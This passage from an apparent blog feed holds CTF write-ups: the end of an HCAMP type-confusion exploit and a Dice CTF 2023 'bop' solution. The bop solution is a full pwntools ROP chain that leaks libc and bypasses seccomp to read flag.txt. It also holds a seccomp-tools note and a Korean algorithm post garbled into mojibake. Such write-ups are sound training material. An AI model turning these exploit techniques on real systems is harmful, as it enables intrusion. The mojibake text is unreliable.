info(<span class="string">&#x27;leak : &#x27;</span> +leak)</span><br><span class="line">            libc.address = <span class="built_in">int</span>(leak, <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">            info(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">            payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span>- <span class="built_in">len</span>(payload))</span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])   <span class="comment"># [32]</span></span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>]+<span class="number">4</span>) <span class="comment"># [33] 7f?? =&gt; got2</span></span><br><span class="line">            </span><br><span class="line">            p.send(payload)</span><br><span class="line"></span><br><span class="line">            system_low = <span class="built_in">int</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[-<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>)) <span class="comment"># 1</span></span><br><span class="line">            payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(system_low)</span><br><span class="line">            payload += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(got2)</span><br><span class="line">            pause()</span><br><span class="line">            p.send(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> NotImplementedError</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> es:</span><br><span class="line">        <span class="built_in">print</span>(es)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;FUNNY_TYPECONFUSION&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HCAMP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
            <tag> Type Confusion </tag>
            
            <tag> 1-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF 2023 - bop (seccomp)</title>
      <link href="/230207-dicectf2023-bop/"/>
      <url>/230207-dicectf2023-bop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1838">https://ctftime.org/event/1838</a></li></ul><blockquote><p><code>nc mc.ax 30284</code></p></blockquote><ul><li>[159 solves &#x2F; 117 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM pwn.red/jail:0.3.1</span><br><span class="line"></span><br><span class="line">COPY --from=ubuntu@sha256:bffb6799d706144f263f4b91e1226745ffb5643ea0ea89c2f709208e8d70c999 / /srv</span><br><span class="line">COPY flag.txt /srv/app/</span><br><span class="line">COPY bop /srv/app/run</span><br></pre></td></tr></table></figure><p>I patched the binary first before solve this binary.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>We can see the function related with <code>seccomp</code> when open the binary with IDA. So we can use the <code>seccomp-tools</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Only <code>open</code>, <code>read</code>, and <code>write</code> are available. But libcâ€™s <code>open</code> function actually uses <code>openat</code> syscall. So We canâ€™t use that function. We have to use the <code>open</code> syscall.</p><p>I use the <code>ropper</code> to find the <code>syscall ; ret</code> gadget.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li>flag.txt open, read and write</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;mc.ax&#x27;</span> ,<span class="number">30284</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4012F9</span></span><br><span class="line">pop_rdi = <span class="number">0x4013d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4013d1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper -f libc.so.6 --nocolor &gt; rop.txt</span></span><br><span class="line">pop_rdx = <span class="number">0x142c92</span> <span class="comment"># libc </span></span><br><span class="line">syscall_ret = <span class="number">0x630a9</span> <span class="comment"># libc</span></span><br><span class="line">pop_rax = <span class="number">0x36174</span> <span class="comment"># libc</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(main) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base : &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, bss, 8) flag.txt</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(./flag.txt) syscall</span></span><br><span class="line">payload += p64(pop_rax + libc.address)</span><br><span class="line">payload += p64(<span class="number">2</span>) <span class="comment"># open</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(syscall_ret + libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(1, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line">p.send(<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dice&#123;ba_da_ba_da_ba_be_bop_bop_bodda_bope_f8a01d8ec4e2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - seccomp</title>
      <link href="/230206-pwn-seccomp/"/>
      <url>/230206-pwn-seccomp/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/dr0gba/seccomp-tools">https://github.com/dr0gba/seccomp-tools</a></li></ul><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="use"><a href="#use" class="headerlink" title="use"></a>use</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump [chall]</span><br></pre></td></tr></table></figure><ul><li>result</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Related Challenge</p><ul><li><a href="https://jiravvit.github.io/221005-d-ctf2022-destruction/">https://jiravvit.github.io/221005-d-ctf2022-destruction/</a></li><li><a href="https://jiravvit.github.io/230207-dicectf2023-bop/">https://jiravvit.github.io/230207-dicectf2023-bop/</a></li></ul><h2 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING:  You don&#x27;t have /home/jir4vvit/.local/share/gem/ruby/3.0.0/bin in your PATH,</span><br><span class="line">          gem executables will not run.</span><br></pre></td></tr></table></figure><p>If you get warning as above when you use the <code>gem</code>, you execute the command below.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GEM_HOME=<span class="string">&quot;<span class="subst">$(ruby -e &#x27;puts Gem.user_dir&#x27;)</span>&quot;</span> </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:<span class="variable">$GEM_HOME</span>/bin&quot;</span></span><br><span class="line">gem list</span><br><span class="line">gem update</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Recursion, DFS, Backtracking (Baekjoon 15649, 15650, 15651, 15652 C)</title>
      <link href="/230202-algorithm-dfs_backtracking/"/>
      <url>/230202-algorithm-dfs_backtracking/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li><a href="https://solved.ac/en/profile/cutieee">https://solved.ac/en/profile/cutieee</a></li></ul><p>ìš”ì¦˜ Cë¡œ ë°±ì¤€ì„ ê¾¸ì¤€ížˆ í’€ê³  ìžˆë‹¤. ì´ ê¸€ì„ ì‹œì ìœ¼ë¡œ Streak 54 daysë¥¼ ë‹¬ì„±í–ˆë‹¤. ì§ì§ì§! ì–´ì œì¯¤ ì‹¤ë²„ 2ë¥¼ ë‹¬ì„±í–ˆëŠ”ë° ìš”ì¦˜ ë“¤ì–´ ì•Œê³ ë¦¬ì¦˜ì„ ë”°ë¡œ ê³µë¶€í•´ì•¼í•  í•„ìš”ì„±ì„ ëŠë‚€ë‹¤. ê·¸ëƒ¥ í’€ê²Œ ë˜ë©´ ì‹œê°„ ì´ˆê³¼ê°€ ë‚˜ê¸° ì¼ìˆ˜. í˜¹ì€ ë¬¸ì œ í’€ì´ ë°©í–¥ì„±ì„ ìž¡ê¸°ê°€ íž˜ë“¤ë‹¤.</p><p>ë°±ì¤€ 15649, 15650, 15651, 15652 ë¬¸ì œë¥¼ í’€ë©´ì„œ ìž¬ê·€, DFS, ë°±íŠ¸ëž˜í‚¹ ê°œë…ì„ ë‹¤ì§ˆ ìˆ˜ ìžˆì—ˆë‹¤. ë°±ì¤€ ì‚¬ì´íŠ¸ì—ì„œ <a href="https://www.acmicpc.net/step/34">ë‹¨ê³„ë³„ë¡œ í’€ì–´ë³´ê¸°</a>ì—ì„œ ë°±íŠ¸ëž˜í‚¹ ìž…ë¬¸ ë¬¸ì œë¥¼ ìŠ¤ìŠ¤ë¡œ í’€ì´í•˜ì˜€ë‹¤. ë¬¸ì œë¥¼ í’€ì´í•˜ë©´ì„œ ì–»ì€ ì§€ì‹ì„ ë¸”ë¡œê·¸ì— ì •ë¦¬í•´ë†“ìœ¼ë ¤ê³  í•œë‹¤.</p><p>ì´ ê¸€ì˜ ëª©í‘œëŠ” ë°±íŠ¸ëž˜í‚¹ì„ ì´í•´í•˜ê³  ë°±ì¤€ 15649, 15650, 15651, 15652 ë¬¸ì œë¥¼ í‘¸ëŠ” ê²ƒì´ë‹¤.</p><h2 id="Recursion-ìž¬ê·€"><a href="#Recursion-ìž¬ê·€" class="headerlink" title="Recursion ìž¬ê·€"></a>Recursion ìž¬ê·€</h2><p>ìž¬ê·€ í•¨ìˆ˜ë¥¼ ì•„ëž˜ì™€ ê°™ì´ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> func(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p><code>func</code> í•¨ìˆ˜ëŠ” n+1ì„ ì¸ìžë¡œ ìžê¸° ìžì‹ ì„ ë‹¤ì‹œ í˜¸ì¶œí•œë‹¤. nì´ 5ì¼ ë•Œ ì¶œë ¥í•˜ì§€ ì•Šê³  ì¢…ë£Œí•œë‹¤. </p><p>ìž¬ê·€ í•¨ìˆ˜ëŠ” ì£¼ë¡œ ê°€ë…ì„±ì„ ìœ„í•´ ì“°ì—¬ì§„ë‹¤. (ì´ë¡ ì ìœ¼ë¡œ ìž¬ê·€í•¨ìˆ˜ëŠ” forë¬¸ê³¼ whileë¬¸ ë“±ìœ¼ë¡œ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤.) ìž¬ê·€ í•¨ìˆ˜ì— ëŒ€í•œ ì´í•´ê°€ ì–´ë ¤ìš´ ì´ìœ ëŠ” ìž¬ê·€ í•¨ìˆ˜ë¥¼ ì¼ë°˜ í•¨ìˆ˜ì™€ ë‹¤ë¥´ê²Œ ìƒê°í•˜ê¸° ë•Œë¬¸ì´ë‹¤. ì‚¬ì‹¤ í”ížˆ ì•„ëŠ” ì¼ë°˜ í•¨ìˆ˜ì™€ ê°™ë‹¤ê³  ìƒê°í•˜ë©´ ì´ê²Œ ë¬´ì—‡ì¸ì§€ëŠ” ë°”ë¡œ ì´í•´ê°€ ë  ê²ƒì´ë‹¤.</p><h2 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h2><p>DFS(Depth - First - Search)ëŠ” ê¹Šì´ ìš°ì„  íƒìƒ‰ì„ ì˜ë¯¸í•œë‹¤. ì–´ë– í•œ ë‚´ìš©ì„ ë¸Œë£¨íŠ¸ í¬ì‹±í•  ë•Œ ì œì¼ ê¹Šì´ ë‚´ë ¤ê°€ì„œ ì•„ëž˜ë‹¨ë¶€í„° íƒìƒ‰í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤. ì•„ëž˜ gifë¥¼ ë³´ë©´ ìž˜ ì´í•´ê°€ ë  ê²ƒì´ë‹¤. </p><img src="/images/230202-algorithm-dfs_backtracking/Depth-First-Search.gif" width=350/><br>DFSëŠ” ì£¼ë¡œ ê·¸ëž˜í”„ë‚˜ íŠ¸ë¦¬ì™€ ì—°ê´€ë˜ì–´ ì‚¬ìš©ëœë‹¤ê³  í•œë‹¤. ì½”ë“œëŠ” ì•„ëž˜ ë°±íŠ¸ëž˜í‚¹ ì„¤ëª…ì—ì„œ í•œêº¼ë²ˆì— ì‚´íŽ´ë³´ìž.<p>DFSëŠ” ì¡°ê±´ ìƒê´€ì—†ì´ ëª¨ë“  ê²ƒì„ íƒìƒ‰í•´ì•¼ í•œë‹¤. <code>ë°±ì¤€ 15649 Nê³¼ M (1)</code> ë³´ë‹¤ <code>ë°±ì¤€ 15651 Nê³¼ M (3)</code> ë¶€í„° í’€ì´ë¥¼ ì§„í–‰í•˜ëŠ” ê²ƒì´ ë°±íŠ¸ëž˜í‚¹ ì´í•´ì— ë” ë„ì›€ì´ ë  ë“¯ í•˜ë‹¤. (ìŠ¤í¬ì§€ë§Œ (3)ì€ ë°±íŠ¸ëž˜í‚¹ ê°œë… ì—†ì´ DFSë§Œì„ ê°€ì§€ê³  í’€ì´í•  ìˆ˜ ìžˆë‹¤.)</p><ul><li><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></li></ul><h2 id="Backtracking"><a href="#Backtracking" class="headerlink" title="Backtracking"></a>Backtracking</h2><p>ìœ„ì˜ DFSì—ì„œ ë´¤ë˜ íŠ¸ë¦¬ë¥¼ ìž ê¹ ìƒìƒí•´ë³´ìž. ì •ë‹µì„ ì°¾ê¸°ìœ„í•´ ë¶€ëª¨ ë…¸ë“œì—ì„œ ìžì‹ ë…¸ë“œê¹Œì§€ ë‚´ë ¤ê°„ë‹¤. ì´ë•Œ ì–´ë– í•œ ì¡°ê±´ì— ë¶€í•©í•˜ëŠ” ê²½ìš°ë§Œ ìžì‹ ë…¸ë“œë¡œ ë‚´ë ¤ê°€ê³  ê·¸ë ‡ì§€ ì•Šë‹¤ë©´ ë‹¤ì‹œ ë¶€ëª¨ ë…¸ë“œë¡œ ì˜¬ë¼ê°„ë‹¤. ì´ëŸ¬í•œ <code>ì¡°ê±´ì— ë¶€í•©í•œë‹¤.</code>ë¥¼ <strong><code>ìœ ë§í•˜ë‹¤.</code></strong> ë¼ê³  í‘œí˜„í•œë‹¤. ì¡°ê±´ì— ë¶€í•©í•˜ì§€ ì•Šì€, ì¦‰ ìœ ë§í•˜ì§€ ì•Šì€ ë…¸ë“œëŠ” í™•ì¸ì„ ì•ˆí•˜ê¸° ë•Œë¬¸ì— í’€ì´ ì‹œê°„ì„ ë‹¨ì¶•í•  ìˆ˜ ìžˆë‹¤. </p><p>íŠ¸ë¦¬ë¡œ ì˜ˆì‹œë¥¼ ë“¤ì—ˆì§€ë§Œ ì‚¬ì‹¤ êµ¬í˜„ì€ íë‚˜ ìž¬ê·€í•¨ìˆ˜ë¡œ ë§Žì´ í•œë‹¤ê³  í•œë‹¤. ì´ ê¸€ì—ì„  ìž¬ê·€í•¨ìˆ˜ë¡œ ë¬¸ì œë¥¼ í’€ì´í•˜ë„ë¡ í•œë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ì •ë‹µì´ë¼ë©´) &#123;</span><br><span class="line">        ì •ë‹µ ì¶œë ¥ í›„ ì¢…ë£Œ</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//ì •ë‹µì´ ì•„ë‹ˆë¼ë©´</span></span><br><span class="line">        <span class="keyword">for</span> (ëª¨ë“  ìžì‹ ë…¸ë“œì— ëŒ€í•´ì„œ) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ì •ë‹µì— ìœ ë§í•˜ë‹¤ë©´) &#123;</span><br><span class="line">                ìžì‹ ë…¸ë“œë¡œ ì´ë™</span><br><span class="line">                DFS(depth + <span class="number">1</span>);</span><br><span class="line">                ë¶€ëª¨ ë…¸ë“œë¡œ ì´ë™</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìž¬ê·€ í•¨ìˆ˜ ë°‘ì— ë‚˜ì˜¤ëŠ” ë¬¸ìž¥ì€ ì–´ë–»ê²Œ ì´í•´í•´ì•¼ í• ê¹Œ?<br>ì •ë‹µì— ìœ ë§í•˜ë‹¤ë©´ ìžì‹ ë…¸ë“œë¥¼ ì¼ë‹¨ ì„ íƒí•œ ë’¤ì—, ê·¸ê±¸ ì„ íƒí•œ í›„ í•´ê²°í•œ ë’¤ì—, ë‹¤ì‹œ ì›ëž˜ì˜ ìƒíƒœë¡œ ë˜ëŒë¦°ë‹¤.(ë¶€ëª¨ ë…¸ë“œë¡œ ì´ë™) </p><h2 